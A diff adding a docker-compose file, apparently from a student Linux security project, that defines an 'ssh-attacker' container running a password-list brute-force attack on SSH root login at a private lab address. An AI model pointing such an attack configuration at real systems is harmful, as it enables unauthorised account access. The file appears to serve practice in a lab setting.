@@ -1,0 +1,16 @@
+services:
+  ssh-attacker:
+    build: .
+    networks:
+      my_custom_network:
+        ipv4_address: 192.168.100.50
+    volumes:
+      - /home/aporadonelly/Desktop/Becode/02-Linux/10-Project/my_passwords.txt:/passwords.txt
+    command: ["-l", "root", "-P", "/passwords.txt", "ssh://10.0.2.15", "-t", "4", "-f"]
+
+networks:
+  my_custom_network:
+    driver: bridge
+    ipam:
+      config:
+        - subnet: 192.168.100.0/24
